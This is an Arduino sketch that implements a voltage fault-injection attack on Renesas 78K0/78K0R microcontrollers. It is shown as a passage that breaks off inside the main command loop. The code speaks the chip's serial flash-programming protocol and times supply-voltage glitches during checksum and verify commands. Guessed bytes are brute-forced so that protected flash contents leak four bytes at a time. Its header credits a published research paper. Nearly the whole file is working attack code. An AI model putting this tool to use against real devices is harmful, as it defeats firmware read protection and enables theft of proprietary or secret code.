/*****************************************************************
 *
 * 78K0R_flash_driver.ino
 *
 * Serial comms driver for 78K0/78K0R devices flash programmer interface
 * Intended to be used with the fault injection interface to leak flash
 * contents sequentially.
 *
 * Developed based on the attack outline by Claudio Bozzato, Riccardo Focardi,
 * and Francesco Palmarini in their paper 
 * "Shaping the Glitch: Optimizing Voltage Fault Injection Attacks".
 *
 * There is no copyright or responsibility accepted for the use
 * of this software.
 *
 * Author: Andrew G Belcher,
 * Email AndrewGBelcher@outlook.com
 * Date: 4th of September, 2020
 *
 *****************************************************************/

/*****************************************************************
 *	Defines
 *****************************************************************/
// pin configs
#define flmd_pin    	2
#define reset_pin   	3
#define trigger_pin 	15
#define glitch_pin  	17
#define detected_pin  	22

// serial comms configs
#define ETX         3
#define SOH         1
#define STX         2

// flash mem min block size
#define BLK_SIZE 0x100

// set comms speed
#define BAUD_115200

#ifdef BAUD_115200
#define BAUD 115200
#else
#define BAUD 500000
#endif

//#define log_verify
//#define log_checksum

/*****************************************************************
 *	Global Variables
 *****************************************************************/

bool reset_cl = true;
char hexchar[7];
uint8_t c = 0;
uint8_t d = 0;
int detect_cnt = 0;
int detect_cnt2 = 0;
bool detected = false;
bool cl_detected = false;
bool detected2 = false;
uint32_t iter = 0;
int i = 0;
bool not_blank = false;
int rounds;

uint32_t glitch1_pos = 0;
uint32_t glitch2_pos = 0;
uint32_t glitch1_len = 0;
uint32_t glitch2_len = 0;

bool script_running = false;
char outstr[50];
uint16_t chksum = 0;
bool checked = false;
int sbox_slide = 0;
int keys = 0;

int rand_len;
int rand_slide;
int rand_len2;
int rand_slide2;

uint16_t corrupt_sums[0x400];
int corrupt_sum_index = 0;
int corrupt_sum_read_count = 0;
int corrupt_bytesum_read_count = 0;
bool sum_logged = false;

uint64_t guess_count = 0;
uint64_t guess_index = 0;
uint8_t guess_buffer[4][20000];
uint8_t verify_buffer[0x1000];
uint8_t program_buffer[0x1000];
int mode = 0;

String str;
String str2;
String size_str;

unsigned long guess_size = 0;
bool done_reading_guess = false;
unsigned int guess_read_count = 0;

unsigned int update_size = 0;
unsigned int verify_read_count = 0;
bool done_reading_verify = false;
unsigned int verify_index = 0;

bool checksum_leak_short_args_updated[2] = {false,false};
int checksum_leak_short_args[2];

bool checksum_leak_args_updated[5] = {false,false,false,false,false};
int checksum_leak_args[5];

bool short_verify_args_updated[2] = {false,false};
int short_verify_args[2];

bool update_verify_args_updated[1] = {false};
int update_verify_args[1];

int old_block_num;
int block_full_checksum;

bool recorded = false;

enum mode{NOP,CHECKSUM_LEAK, CHECKSUM_LEAK_SHORT, SHORT_VERIFY, SHORT_CHECKSUM, UPDATE_GUESS, UPDATE_VERIFY};


/*****************************************************************
 *	Utility Functions
 *****************************************************************/

// update verify data buffer with guess data
void update_verify_guess(int block_index, int guess_index)
{

	for(int p = 0; p<4; p++) 
	{ 
		verify_buffer[p + (block_index*4)] = guess_buffer[p][guess_index];
	}
}

// clear all data from rx buffer
void clear_serial_buffer(void)
{

	Serial1.flush();
	while(Serial1.available() > 0)
	Serial1.read();
}


// cmd and data packet checksum
uint8_t checksum(int len, uint8_t* buf)
{

	uint8_t value = 0;

	for(int i = 0; i < len; i++)
	{
		value += buf[i];  
	}  

	value += len;  

	value = ~value+1;

	return value;
}


// detect and print bytes relating to a response to the verify cmd
bool log_serial_bytes_verify(void)
{
  
    detect_cnt = 0;
    detected = false;

    while(Serial1.available() > 0)
    {
		c = Serial1.read();

		switch(detect_cnt)
		{
			case 0:

				if(c == 0x02)
				{
					detect_cnt++;
				}
				else
				{
					detect_cnt = 0;
				}
				break;

			case 1:

				if(c == 0x02)
				{
					checked = true;
					detect_cnt++;
				}
				else
				{
					detect_cnt = 0;
				}
				break;

			case 2:

				chksum = c;
				detect_cnt++;
				break;

			case 3:

				if(c == 0x06)
				{
					detected = true;
				}
				else
				{
					detected = false;  
				}

				detect_cnt = 0;;
				break;
		}            

#ifdef log_verify
		sprintf(hexchar, "%02X", c);
		Serial.print(hexchar);
		Serial.print(" ");       
		}
		Serial.print("\n");
#else
	}
#endif
	


    if(detected)
    {
      delay(10);

      Serial.print("svfound\n");

      sprintf(hexchar, "%02X", guess_buffer[0][guess_count-1]);
      Serial.print(hexchar);

      sprintf(hexchar, "%02X", guess_buffer[1][guess_count-1]);
      Serial.print(hexchar);  

      sprintf(hexchar, "%02X", guess_buffer[2][guess_count-1]);
      Serial.print(hexchar);

      sprintf(hexchar, "%02X", guess_buffer[3][guess_count-1]);
      Serial.print(hexchar);

      guess_size = 0;
      
    }           
}


// wipe corrupt sums gathered in short checksum fault injection
void clear_corrupt_sums(void)
{
	for(int i = 0; i < 0x400; i++)
	{
		corrupt_sums[i] = 0;
	} 

	sum_logged = false;
}

// detect and print checksum repsonse data
void log_serial_bytes_checksum(long full_checksum, bool vbose)
{

	detect_cnt = 0;
	cl_detected = false;
	recorded = false;          

	while(Serial1.available())
	{
		c = Serial1.read();

		switch(detect_cnt)
		{
			// checksum data reply
			// 02 02 xx xx chksum 03
			case 0:
				if(c == 0x02)
				{
					detect_cnt++;
				}
				else
				{
					detect_cnt = 0;
				}
				break;

			case 1:
				if(c == 0x02)
				{
					checked = true;
					detect_cnt++;
					cl_detected = true;
				}
				else
				{
					detect_cnt = 0;
				}
				break;

			case 2:
				chksum = c;
				detect_cnt++;
				break;

			case 3:
				chksum = chksum << 8;
				chksum += (uint16_t)c;
				recorded = true;          
				detect_cnt = 0;;
				break;

			default:
				break;
		}        

		if(recorded)
		{
			if(chksum != full_checksum &
			chksum != 0 &
			(full_checksum - chksum) != 0x2a6 & // filter false positives
			(full_checksum - chksum) != 0x2c7 & 
			(full_checksum - chksum) != 0x410
			)
			{

				for(int i = 0; i < 0x400; i++)
				{
					if(chksum == corrupt_sums[i])
					{
						sum_logged = true;
					}
				}

				if(!sum_logged)
				{
					corrupt_sum_read_count++;
					corrupt_sums[corrupt_sum_index] = chksum;

					if(vbose)
					{
						sprintf(outstr, " 0x%X 0x%X 0x%X\n", chksum, ((uint32_t)full_checksum - (uint32_t)chksum), ((uint32_t)chksum - (uint32_t)full_checksum));     
						Serial.print(outstr);
						corrupt_sum_index++;
					}
				}
			}
#ifdef checksum_log
			sprintf(hexchar, "%02X", c);
			Serial.print(hexchar);
			Serial.print(" ");       
#endif
		}
	}

	if(cl_detected)
	{
		reset_cl = false;
	}
	else
	{
		reset_cl = true;

#if checksum_log
		Serial.print("\n");
#endif
	}
}




/*****************************************************************
 *	Flash Program Interface Functions
 *****************************************************************/



// drive flmd/reset/tool0 to enter flash programming mode
void enter_flash_mode(void)
{

	digitalWrite(flmd_pin, LOW);

	digitalWrite(reset_pin, LOW);  

	delay(2);

	digitalWrite(reset_pin, HIGH);  

	delay(2);  

	digitalWrite(flmd_pin, HIGH);

	delay(10);  

	Serial1.write(0);

	delay(2);  

	Serial1.write(0);

	delay(2);  
}

// enter flash programming mode and input cmds nessesary to begin reception or block related cmds
void init_flasher_comms(void)
{
  
	Serial1.begin(9600);

	enter_flash_mode();

	delay(5);

	cmd_init();

	delay(13);

	cmd_baud_set();

	delay(11);

	Serial1.begin(BAUD);

	delayMicroseconds(1000);

	cmd_init();

	delayMicroseconds(1000);

	cmd_signature();

	delayMicroseconds(700);

	clear_serial_buffer();

}


// send init cmd
void cmd_init(void)
{

	uint8_t buf[] = {0};

	Serial1.write(SOH);

	Serial1.write(sizeof(buf));

	for(int i = 0; i < sizeof(buf); i++)
	{
		Serial1.write(buf[i]);
	}

	Serial1.write(checksum(1, buf));

	Serial1.write(ETX);

}

// send baud set command
void cmd_baud_set(void)
{

	#ifdef BAUD_115200
	uint8_t buf[] = {0x9a, 0, 0 , 0x0a, 1, 0};
	#else
	uint8_t buf[] = {0x9a, 1, 0 , 8, 1, 1};
	#endif

	Serial1.write(SOH);

	Serial1.write(sizeof(buf));

	for(int i = 0; i < sizeof(buf); i++)
	{
		Serial1.write(buf[i]);
	}

	Serial1.write(checksum(sizeof(buf), buf));

	Serial1.write(ETX);
}

// send get signature data cmd
void cmd_signature(void)
{

	uint8_t buf[] = {0xc0};

	Serial1.write(SOH);

	Serial1.write(sizeof(buf));

	for(int i = 0; i < sizeof(buf); i++)
	{
		Serial1.write(buf[i]);
	}

	Serial1.write(checksum(1, buf));

	Serial1.write(ETX);
}

// send get flasher version cmd
void cmd_flasher_version(void)
{

	uint8_t buf[] = {0xc5};

	Serial1.write(SOH);

	Serial1.write(sizeof(buf));

	for(int i = 0; i < sizeof(buf); i++)
	{
		Serial1.write(buf[i]);
	}

	Serial1.write(checksum(1, buf));

	Serial1.write(ETX);
}

// send cmd for verifying section of flash (1/2 parts) cmd + data
void cmd_offset_verify(uint32_t off, int len)
{

	uint8_t addr_upper_lo = len-1;
	uint8_t addr_upper_md = (off >> 8) & 0xff;
	uint8_t addr_upper_hi = (off >> 16) & 0xff;

	uint8_t addr_lower_lo = off & 0xff;
	uint8_t addr_lower_md = (off >> 8) & 0xff;
	uint8_t addr_lower_hi = (off >> 16) & 0xff;

	uint8_t buf[] = {0x13, addr_lower_hi, addr_lower_md, addr_lower_lo, addr_upper_hi, addr_upper_md, addr_upper_lo};

	Serial1.write(SOH);

	delayMicroseconds(20);

	Serial1.write(sizeof(buf));

	delayMicroseconds(20);

	for(int i = 0; i < sizeof(buf); i++)
	{
		Serial1.write(buf[i]);
		delayMicroseconds(20);
	}

	Serial1.write(checksum(sizeof(buf),buf));
	delayMicroseconds(20);

	Serial1.write(ETX);

}

// send cmd for verifying a block of flash (1/2 parts) cmd + data
void cmd_block_verify(int block_index)
{

	uint8_t addr_upper_lo = (BLK_SIZE * (block_index + 1)) - 1 & 0xff;
	uint8_t addr_upper_md = (BLK_SIZE * (block_index + 1) - 1 >> 8) & 0xff;
	uint8_t addr_upper_hi = (BLK_SIZE * (block_index + 1) - 1 >> 16) & 0xff;

	uint8_t addr_lower_lo = (BLK_SIZE * (block_index)) & 0xff;
	uint8_t addr_lower_md = ((BLK_SIZE * (block_index)) >> 8) & 0xff;
	uint8_t addr_lower_hi = ((BLK_SIZE * (block_index)) >> 16) & 0xff;


	uint8_t buf[] = {0x13, addr_lower_hi, addr_lower_md, addr_lower_lo, addr_upper_hi, addr_upper_md, addr_upper_lo};

	Serial1.write(SOH);

	delayMicroseconds(20);

	Serial1.write(sizeof(buf));

	delayMicroseconds(20);

	for(int i = 0; i < sizeof(buf); i++)
	{
		Serial1.write(buf[i]);
		delayMicroseconds(20);
	}

	Serial1.write(checksum(sizeof(buf),buf));
	delayMicroseconds(20);

	Serial1.write(ETX);

}


// send data from the verify buffer, (2/2) cmd + data, len dictates how much of the buffer to be sent.
void data_verify(int len)
{
  
	uint8_t buf[len];

	for(int p = 0; p < len; p++)
	{
		buf[p] = verify_buffer[p];
	}

	Serial1.write(STX);
	delayMicroseconds(20);
	Serial1.write(sizeof(buf));
	delayMicroseconds(20);

	for(int i = 0; i < sizeof(buf); i++)
	{
		Serial1.write(buf[i]);
		delayMicroseconds(20);
	}

	Serial1.write(checksum(sizeof(buf),buf));
	delayMicroseconds(20);

	Serial1.write(ETX);  
  
}

// send cmd for getting checksum of a block
void cmd_block_checksum(int block_index)
{

	uint8_t addr_upper_lo = (BLK_SIZE * (block_index + 1)) - 1 & 0xff;
	uint8_t addr_upper_md = (BLK_SIZE * (block_index + 1) - 1 >> 8) & 0xff;
	uint8_t addr_upper_hi = (BLK_SIZE * (block_index + 1) - 1 >> 16) & 0xff;

	uint8_t addr_lower_lo = (BLK_SIZE * (block_index)) & 0xff;
	uint8_t addr_lower_md = ((BLK_SIZE * (block_index)) >> 8) & 0xff;
	uint8_t addr_lower_hi = ((BLK_SIZE * (block_index)) >> 16) & 0xff;

	uint8_t buf[] = {0xb0, addr_lower_hi, addr_lower_md, addr_lower_lo, addr_upper_hi, addr_upper_md, addr_upper_lo};

	Serial1.write(SOH);
	delayMicroseconds(20);

	Serial1.write(sizeof(buf));
	delayMicroseconds(20);

	for(int i = 0; i < sizeof(buf); i++)
	{
		Serial1.write(buf[i]);
		delayMicroseconds(20);
	}

	Serial1.write(checksum(sizeof(buf),buf));
	delayMicroseconds(2);

	Serial1.write(ETX);

}

// send cmd for getting a checksum of 4 bytes in a block using the block index and length to set range
void cmd_block_checksum_short(int block_index, int len)
{

	uint8_t addr_upper_lo = len - 1;
	uint8_t addr_upper_md = (BLK_SIZE * (block_index + 1) - 1 >> 8) & 0xff;
	uint8_t addr_upper_hi = (BLK_SIZE * (block_index + 1) - 1 >> 16) & 0xff;

	uint8_t addr_lower_lo = (BLK_SIZE * (block_index)) & 0xff;
	uint8_t addr_lower_md = ((BLK_SIZE * (block_index)) >> 8) & 0xff;
	uint8_t addr_lower_hi = ((BLK_SIZE * (block_index)) >> 16) & 0xff;

	uint8_t buf[] = {0xb0, addr_lower_hi, addr_lower_md, addr_lower_lo, addr_upper_hi, addr_upper_md, addr_upper_lo};

	Serial1.write(SOH);
	delayMicroseconds(100);

	Serial1.write(sizeof(buf));
	delayMicroseconds(100);

	for(int i = 0; i < sizeof(buf); i++)
	{
		Serial1.write(buf[i]);
		delayMicroseconds(100);
	}

	Serial1.write(checksum(sizeof(buf),buf));
	delayMicroseconds(2);

	Serial1.write(ETX);

}

// send cmd for checking a block if its blank (0xffs)
void cmd_block_blank(int block_index)
{

	uint8_t addr_upper_lo = (BLK_SIZE * (block_index + 1)) - 1 & 0xff;
	uint8_t addr_upper_md = (BLK_SIZE * (block_index + 1) - 1 >> 8) & 0xff;
	uint8_t addr_upper_hi = (BLK_SIZE * (block_index + 1) - 1 >> 16) & 0xff;

	uint8_t addr_lower_lo = (BLK_SIZE * (block_index)) & 0xff;
	uint8_t addr_lower_md = ((BLK_SIZE * (block_index)) >> 8) & 0xff;
	uint8_t addr_lower_hi = ((BLK_SIZE * (block_index)) >> 16) & 0xff;

	uint8_t buf[] = {0x32, addr_lower_hi, addr_lower_md, addr_lower_lo, addr_upper_hi, addr_upper_md, addr_upper_lo, 0x00};

	Serial1.write(SOH);
	delayMicroseconds(100);

	Serial1.write(sizeof(buf));
	delayMicroseconds(100);

	for(int i = 0; i < sizeof(buf); i++)
	{
		Serial1.write(buf[i]);
		delayMicroseconds(100);
	}

	Serial1.write(checksum(sizeof(buf),buf));
	delayMicroseconds(100);

	Serial1.write(ETX);

}

// send cmd for programming a block (1/2) parts
void cmd_program(int block_index)
{
  
	uint8_t addr_upper_lo = (BLK_SIZE * (block_index + 1)) - 1 & 0xff;
	uint8_t addr_upper_md = (BLK_SIZE * (block_index + 1) - 1 >> 8) & 0xff;
	uint8_t addr_upper_hi = (BLK_SIZE * (block_index + 1) - 1 >> 16) & 0xff;

	uint8_t addr_lower_lo = (BLK_SIZE * (block_index)) & 0xff;
	uint8_t addr_lower_md = ((BLK_SIZE * (block_index)) >> 8) & 0xff;
	uint8_t addr_lower_hi = ((BLK_SIZE * (block_index)) >> 16) & 0xff;


	uint8_t buf[] = {0x40, addr_lower_hi, addr_lower_md, addr_lower_lo, addr_upper_hi, addr_upper_md, addr_upper_lo};

	Serial1.write(SOH);
	delayMicroseconds(100);

	Serial1.write(sizeof(buf));
	delayMicroseconds(100);


	for(int i = 0; i < sizeof(buf); i++)
	{
		Serial1.write(buf[i]);
		delayMicroseconds(100);
	}

	Serial1.write(checksum(sizeof(buf),buf));

	delayMicroseconds(100);

	Serial1.write(ETX);

}

// send data to be programmed in the set block (2/2) parts
void data_program(int len)
{
  
	uint8_t buf[len];

	for(int p = 0; p<len; p++)
	{
		buf[p] = program_buffer[p];
	}

	Serial1.write(STX);
	delayMicroseconds(100);

	Serial1.write(sizeof(buf));
	delayMicroseconds(100);

	for(int i = 0; i < sizeof(buf); i++)
	{
	Serial1.write(buf[i]);
	delayMicroseconds(100);
	}

	Serial1.write(checksum(sizeof(buf),buf));
	delayMicroseconds(100);

	Serial1.write(ETX);
      
}

// send cmd for erasing a block (0xffs)
void cmd_block_erase(int block_index)
{

	uint8_t addr_upper_lo = (BLK_SIZE * (block_index + 1)) - 1 & 0xff;
	uint8_t addr_upper_md = (BLK_SIZE * (block_index + 1) - 1 >> 8) & 0xff;
	uint8_t addr_upper_hi = (BLK_SIZE * (block_index + 1) - 1 >> 16) & 0xff;

	uint8_t addr_lower_lo = (BLK_SIZE * (block_index)) & 0xff;
	uint8_t addr_lower_md = ((BLK_SIZE * (block_index)) >> 8) & 0xff;
	uint8_t addr_lower_hi = ((BLK_SIZE * (block_index)) >> 16) & 0xff;


	uint8_t buf[] = {0x22, addr_lower_hi, addr_lower_md, addr_lower_lo, addr_upper_hi, addr_upper_md, addr_upper_lo};

	Serial1.write(SOH);
	delayMicroseconds(100);

	Serial1.write(sizeof(buf));
	delayMicroseconds(100);

	for(int i = 0; i < sizeof(buf); i++)
	{
		Serial1.write(buf[i]);
		delayMicroseconds(100);
	}

	Serial1.write(checksum(sizeof(buf),buf));
	delayMicroseconds(100);

	Serial1.write(ETX);

}

// send cmd for writing ocd entry in the vector table
void cmd_debug_init(void)
{

	uint8_t buf[] = {0x14};

	Serial1.write(SOH);
	Serial1.write(sizeof(buf));

	for(int i = 0; i < sizeof(buf); i++)
	{
		Serial1.write(buf[i]);
	}

	Serial1.write(checksum(sizeof(buf),buf));
	Serial1.write(ETX);

}

// send cmd for setting the security bits
void cmd_set_security(void)
{

	uint8_t buf[] = {0xa0, 0, 0};

	Serial1.write(SOH);
	delayMicroseconds(100);

	Serial1.write(sizeof(buf));
	delayMicroseconds(100);

	for(int i = 0; i < sizeof(buf); i++)
	{
		Serial1.write(buf[i]);
		delayMicroseconds(100);
	}

	Serial1.write(checksum(sizeof(buf),buf));
	delayMicroseconds(100);

	Serial1.write(ETX);

}

// send cmd for performing an internal verify
void cmd_internal_verify(void)
{

	uint8_t buf[] = {0x19, 0, 0, 0, 0, 0, 0, 0};

	Serial1.write(SOH);
	delayMicroseconds(100);

	Serial1.write(sizeof(buf));
	delayMicroseconds(100);

	for(int i = 0; i < sizeof(buf); i++)
	{
		Serial1.write(buf[i]);
		delayMicroseconds(100);
	}

	Serial1.write(checksum(sizeof(buf),buf));
	delayMicroseconds(100);

	Serial1.write(ETX);

}

// send the data to be set after set security cmd
void data_set_security(void)
{
	// 0xff for security byte
	uint8_t buf[] = {0xff, 0x01, 0x00, 0x00, 0x00, 0x01};

	Serial1.write(STX);
	delayMicroseconds(100);

	Serial1.write(sizeof(buf));
	delayMicroseconds(100);

	for(int i = 0; i < sizeof(buf); i++)
	{
		Serial1.write(buf[i]);
		delayMicroseconds(100);
	}

	Serial1.write(checksum(sizeof(buf),buf));
	delayMicroseconds(100);

	Serial1.write(ETX);

}


/*****************************************************************
 *	Fault Injection Functions
 *****************************************************************/


// perform block checksum with fault injection to effect targetted 4 bytes
void glitch_checksum(int block_num,  int slide, int range)
{

	// update rng to increase range/len combinations.
	randomSeed(analogRead(0));

	long pos = random()%range;

	randomSeed(analogRead(0));

	long len = random() % 400;

	randomSeed(analogRead(0));

	// doing so within the function to aid timing
	uint8_t addr_upper_lo = (BLK_SIZE * (block_num + 1)) - 1 & 0xff;
	uint8_t addr_upper_md = (BLK_SIZE * (block_num + 1) - 1 >> 8) & 0xff;
	uint8_t addr_upper_hi = (BLK_SIZE * (block_num + 1) - 1 >> 16) & 0xff;

	uint8_t addr_lower_lo = (BLK_SIZE * (block_num)) & 0xff;
	uint8_t addr_lower_md = ((BLK_SIZE * (block_num)) >> 8) & 0xff;
	uint8_t addr_lower_hi = ((BLK_SIZE * (block_num)) >> 16) & 0xff;

	uint8_t buf[] = {0xb0, addr_lower_hi, addr_lower_md, addr_lower_lo, addr_upper_hi, addr_upper_md, addr_upper_lo};

	Serial1.write(SOH);

	delayMicroseconds(10);

	Serial1.write(sizeof(buf));

	delayMicroseconds(10);

	for(int i = 0; i < sizeof(buf); i++)
	{
		Serial1.write(buf[i]);
		delayMicroseconds(10);
	}

	Serial1.write(checksum(sizeof(buf),buf));

	delayMicroseconds(10);

	Serial1.write(ETX);


	while(digitalRead(0) == HIGH); // delay in time with rx to help alignment

	delayMicroseconds(199);

	// params effecting glitch placement
	delayMicroseconds(slide); //750 779-22= 757
	delayNanoseconds(random()%pos); // 30000

	// holding vdd low to glitch
	digitalWriteFast(glitch_pin, LOW);
	delayNanoseconds(len);
	digitalWriteFast(glitch_pin, HIGH);

}


// perform fault injection to force checksum command to work on 4 bytes
void glitch_checksum_short(int block_num,  int block_index)
{

	randomSeed(analogRead(0));

	long pos = random() % 20000;

	randomSeed(analogRead(0));

	long len = random() % 1000;

	randomSeed(analogRead(0));


	uint8_t addr_upper_lo =  ((block_index + 1) * 4) - 1 & 0xff;
	uint8_t addr_upper_md = (BLK_SIZE*(block_num + 1) - 1 >> 8) & 0xff;
	uint8_t addr_upper_hi = (BLK_SIZE*(block_num + 1) - 1 >> 16) & 0xff;

	uint8_t addr_lower_lo =  (block_index * 4) & 0xff;
	uint8_t addr_lower_md = ((BLK_SIZE*(block_num)) >> 8) & 0xff;
	uint8_t addr_lower_hi = ((BLK_SIZE*(block_num)) >> 16) & 0xff;

	uint8_t buf[] = {0xb0, addr_lower_hi, addr_lower_md, addr_lower_lo, addr_upper_hi, addr_upper_md, addr_upper_lo};

	Serial1.write(SOH);

	delayMicroseconds(20);

	Serial1.write(sizeof(buf));

	delayMicroseconds(20);

	for(int i = 0; i < sizeof(buf); i++)
	{
		Serial1.write(buf[i]);
		delayMicroseconds(20);
	}

	Serial1.write(checksum(sizeof(buf),buf));

	delayMicroseconds(2);

	Serial1.write(ETX);

	while(digitalRead(0)==HIGH);

	delayMicroseconds(84); 

	delayNanoseconds(random()%10000); // 30000

	// holding vdd low to glitch
	digitalWriteFast(glitch_pin, LOW);
	delayNanoseconds((random()%400) + 50);
	digitalWriteFast(glitch_pin, HIGH);
    
}

// verify all guesses at the targeted 4 bytes in the block
void verify_crack(int block_num, int block_index)
{

    delay(2);

    // verify sliding for pattern detection
    cmd_block_verify(block_num);

    delay(2);

    data_verify((block_index * 4) + 4);

    digitalWrite(trigger_pin, HIGH);
    delayMicroseconds(50);
    digitalWrite(trigger_pin, LOW);

    delay(2);

    log_serial_bytes_verify();
  
}

/*****************************************************************
 *	Initialisation
 *****************************************************************/

// init on reset
void setup() 
{

  Serial.begin(1000000);  // interface uart
  Serial1.begin(9600); // tool0 uart

  Serial.print("starting\n");
  
  pinMode(flmd_pin, OUTPUT);
  pinMode(reset_pin, OUTPUT);
  pinMode(glitch_pin, OUTPUT);
  pinMode(detected_pin, OUTPUT);
  pinMode(trigger_pin, OUTPUT);

  digitalWrite(glitch_pin,HIGH);
  digitalWrite(detected_pin,LOW);
  digitalWrite(trigger_pin,LOW);

  clear_corrupt_sums();

}

/*****************************************************************
 *	Main program loop
 *****************************************************************/

// Main program loop
void loop(void) 
{
	keys = 64;
	chksum = 0;
	checked = false;
	sum_logged = false;
	rounds = 0;

	// parse cmds to enter runtime states
	while(!script_running)
	{
		while (Serial.available() > 0 ) 
		{
			str = Serial.readString(); 

			if(str.equals("checksum_leak"))
			{
				checksum_leak_args_updated[0] = false;
				checksum_leak_args_updated[1] = false;
				checksum_leak_args_updated[2] = false;
				checksum_leak_args_updated[3] = false;
				checksum_leak_args_updated[4] = false;

				mode = CHECKSUM_LEAK;

				script_running = true;

				Serial.print("cl\n");
			}

			else if(str.equals("checksum_leak_short"))
			{
				checksum_leak_short_args_updated[0] = false;
				checksum_leak_short_args_updated[1] = false;

				mode = CHECKSUM_LEAK_SHORT;

				script_running = true;

				Serial.print("cls\n");
			}        

			else if(str.equals("short_verify"))
			{
				short_verify_args_updated[0] = false;
				short_verify_args_updated[1] = false;

				mode = SHORT_VERIFY;

				script_running = true;

				Serial.print("sv\n");
			}

			else if(str.equals("short_checksum"))
			{
				mode = SHORT_CHECKSUM;
				script_running = true;
				Serial.print("sc\n");
			}    

			else if(str.equals("update_guess"))
			{
				mode = UPDATE_GUESS;
				script_running = true;
				Serial.print("ug\n");          
			}    

			else if(str.equals("update_verify"))
			{
				update_verify_args_updated[0] = false;
				mode = UPDATE_VERIFY;
				script_running = true;
				Serial.print("uv\n");          
			}                
		}
	}


	// runtime modes
	switch(mode)
	{
		// do nothing
		case NOP:
			break;

		// enter checksum leak mode until satisfied
		case CHECKSUM_LEAK:

			// if no args are set
			if(!checksum_leak_args_updated[0] ||
			!checksum_leak_args_updated[1] ||
			!checksum_leak_args_updated[2] ||
			!checksum_leak_args_updated[3] ||
			!checksum_leak_args_updated[4])
			{
				if(checksum_leak_args_updated[0]) //block num
				{
					if(checksum_leak_args_updated[1]) // glitch pos 
					{      
						if(checksum_leak_args_updated[2]) // glitch range
						{

							if(checksum_leak_args_updated[3]) // needs full checksum
							{
								while(Serial.available() > 0)
								{
									size_str = Serial.readString();
									checksum_leak_args[4] = size_str.toInt();
									checksum_leak_args_updated[4] = true;
								}
							}
							else
							{
								// needs block full checksum
								while(Serial.available() > 0) 
								{                
									size_str = Serial.readString();    
									checksum_leak_args[3] = size_str.toInt();

									if(checksum_leak_args[3] == 1)
									{
										init_flasher_comms();
										delay(3);

										clear_serial_buffer();

										cmd_block_checksum(checksum_leak_args[0]);
										delay(10);

										log_serial_bytes_checksum(0,false);
										block_full_checksum = chksum;

										Serial.print(block_full_checksum,DEC);
										Serial.print("\n");

										clear_serial_buffer();
										checksum_leak_args_updated[3] = true;
										delay(10);
									}
								}
							}                
						}
						else
						{
							// block num
							while(Serial.available() > 0) 
							{
								size_str = Serial.readString();    
								checksum_leak_args[2] = size_str.toInt();
								Serial.print(checksum_leak_args[2],DEC);
								checksum_leak_args_updated[2] = true;
							}      
						}      
					}
					else
					{
						// set pos
						while(Serial.available() > 0) 
						{
							size_str = Serial.readString();    
							checksum_leak_args[1] = size_str.toInt();
							Serial.print(checksum_leak_args[1],DEC);
							checksum_leak_args_updated[1] = true;
						}            
					}
				}

				else
				{
					// set len
					while(Serial.available() > 0) 
					{
						size_str = Serial.readString();    
						checksum_leak_args[0] = size_str.toInt();
						Serial.print(checksum_leak_args[0],DEC);
						checksum_leak_args_updated[0] = true;
					}
				}
			}

			else
			{
				if(reset_cl)
				{
					init_flasher_comms();
					delay(3);
				}

				clear_serial_buffer();

				// blocknum pos range
				glitch_checksum(checksum_leak_args[0], checksum_leak_args[1], checksum_leak_args[2]);

				delay(2);  

				log_serial_bytes_checksum(block_full_checksum, true);

				if(corrupt_sum_read_count > checksum_leak_args[4])
				{
					clear_corrupt_sums();
					corrupt_sum_index = 0;
					corrupt_sum_read_count = 0;

					Serial.print("cldone");
					mode = NOP;
					script_running = false;
				}
			}

			break;


		// enter short checksum mode until satisfied
		case CHECKSUM_LEAK_SHORT:

		// if no args are set
		if(!checksum_leak_short_args_updated[0] ||
		!checksum_leak_short_args_updated[1])
		{
			if(checksum_leak_short_args_updated[0]) //block num set
			{
				// set block index
				while(Serial.available() > 0) 
				{
					size_str = Serial.readString();    
					checksum_leak_short_args[1] = size_str.toInt();
					Serial.print(checksum_leak_short_args[1],DEC);

					init_flasher_comms();
					delay(3);

					clear_serial_buffer();

					cmd_block_checksum(checksum_leak_short_args[0]);
					delay(10);

					log_serial_bytes_checksum(0,false);

					block_full_checksum = chksum;

					Serial.print(block_full_checksum,DEC);

					clear_serial_buffer();
					checksum_leak_short_args_updated[1] = true;
					delay(10);
				}            
			}
			else
			{
				// set block num
				while(Serial.available() > 0) 
				{
					size_str = Serial.readString();    
					checksum_leak_short_args[0] = size_str.toInt();
					Serial.print(checksum_leak_short_args[0],DEC);
					checksum_leak_short_args_updated[0] = true;
				}
			}
		}

		else
		{

			init_flasher_comms();
			delayMicroseconds(500);

			clear_serial_buffer();

			// blocknum blockindex
			glitch_checksum_short(checksum_leak_short_args[0], checksum_leak_short_args[1]);

			delay(3);  

			log_serial_bytes_checksum(0x10000, true);

			if(corrupt_sum_read_count > 1)
			{
				corrupt_sum_read_count = 0;
				Serial.print("clsdone");
				mode = NOP;
				script_running = false;
			}
		}

		break;

		// enter short verify mode until satisfied
		case SHORT_VERIFY:

			// if no args are set
			if(!short_verify_args_updated[0] ||
				!short_verify_args_updated[1])
			{
				if(short_verify_args_updated[0]) //block num set
				{
					// set block index
					while(Serial.available() > 0) 
					{
						size_str = Serial.readString();    
						short_verify_args[1] = size_str.toInt();
						Serial.print(short_verify_args[1],DEC);
						Serial.print("\n");
						short_verify_args_updated[1] = true;
					}            
				}
				else
				{
					// set block num
					while(Serial.available() > 0) 
					{
						size_str = Serial.readString();    
						short_verify_args[0] = size_str.toInt();
						Serial.print(short_verify_args[0],DEC);
						short_verify_args_updated[0] = true;
					}
				}
			}


			else
			{
				if(!detected)
				{
					if(guess_count == 0)
					{
						init_flasher_comms();
					}

					delay(1);

					// verify index
					update_verify_guess(short_verify_args[1], guess_count++);

					clear_serial_buffer();

					// block num, index
					verify_crack(short_verify_args[0], short_verify_args[1]); // need to grab this from python

					delay(1);  

					log_serial_bytes_verify();
					clear_serial_buffer();

				}

				if((guess_count >= guess_size / 4) || detected)
				{


					if(!detected)
					{
						Serial.print("svfailed");
					}          

					mode = NOP;
					guess_size = 0;
					guess_count = 0;
					script_running = false;
				}
			}

			break;

		// enter update guess mode until all guesses are loaded
		case UPDATE_GUESS:

			if(guess_size == 0)
			{
				while(Serial.available() > 0) 
				{
					size_str = Serial.readString();    
					guess_size = size_str.toInt();
					Serial.print(guess_size,DEC);
				}
			}

			else if(guess_size != 0)
			{

				while(Serial.available() > 0) 
				{
					guess_buffer[guess_read_count % 4][guess_read_count / 4] = Serial.read();
					guess_read_count++;
				}

				if(guess_read_count >= guess_size)
				{
					done_reading_guess = true; 
				}      
			}

			if(done_reading_guess)
			{
				Serial.print("dr\n");
				guess_read_count = 0;
				mode = NOP;
				done_reading_guess = false;
